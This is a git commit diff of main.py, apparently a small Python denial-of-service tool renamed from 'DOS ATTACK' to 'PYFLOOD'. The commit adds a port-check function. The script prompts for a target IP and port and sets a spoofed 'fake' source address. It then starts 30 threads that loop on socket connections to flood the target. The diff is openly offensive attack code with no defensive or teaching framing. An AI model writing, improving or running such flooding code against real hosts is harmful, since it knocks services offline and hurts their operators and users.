66e9e002f8a79881e39f9ddd48d026e64f970da0
D3ni <91387367+X310N@users.noreply.github.com>
2022-04-01 00:37:04 -0300

    Update main.py

--- main.py
+++ main.py
@@ -1,11 +1,9 @@
-import socket, threading, time, pyfiglet
+import socket, threading, sys, pyfiglet
 
-print(pyfiglet.figlet_format("DOS ATTACK"))
+print(pyfiglet.figlet_format("PYFLOOD"))
+print("\t\t\t\t\tMade by: X3ion")
+print("_"*60)
 
-
-target = input("TARGET IP: ")
-port = int(input("ENTER THE PORT: "))
-source = '182.21.20.32'
 
 def dos():
     while True:
@@ -16,13 +14,22 @@ def dos():
         
         sock.close()
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
-if sock.connect_ex((target, port)):
-    print("Port", port, "is closed")
-    exit()
+def portScan(target): # Verifying if the given port is open or closed
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
+    if sock.connect_ex((target, port)):
+        print("Port", port, "is closed")
+        sys.exit()
 
-else:
-    print("Port", port, "is open")
+    else:
+        print("Port", port, "is open")
+
+
+target = input("TARGET IP: ")
+port = int(input("ENTER THE PORT: "))
+portScan(target)
+source = '182.21.20.32' # Fake ip address
+
+print("Sending packages... ")
 
 for i in range(30):
     thread = threading.Thread(target=dos)
